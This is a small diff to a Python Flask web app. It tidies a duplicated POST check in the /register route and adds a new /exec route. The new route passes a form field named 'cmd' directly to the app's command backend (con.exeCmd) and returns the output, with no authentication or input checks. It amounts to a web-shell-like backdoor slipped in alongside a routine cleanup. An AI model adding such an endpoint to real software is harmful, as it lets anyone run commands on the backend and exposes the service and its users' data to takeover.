@@ -67,7 +67,6 @@ def query():
 @app.route('/register', methods=['POST'])
 def reg():
     if request.method == 'POST' :
-        if request.method == 'POST':
             res = con.exeCmd(['register', request.form['name'], request.form['password'], request.form['email'], request.form['phone']])
             id = int(res)
             return jsonify({'status': '0'})
@@ -75,6 +74,12 @@ def reg():
 @app.route('/manage')
 def manage():
     return render_template('manage.html', ses=session)
+
+@app.route('/exec', methods=['POST'])
+def exec():
+    if request.method == 'POST' :
+        res = con.exeCmd([request.form['cmd']])
+        return jsonify({'result': res})
 
 
 if __name__ == '__main__':
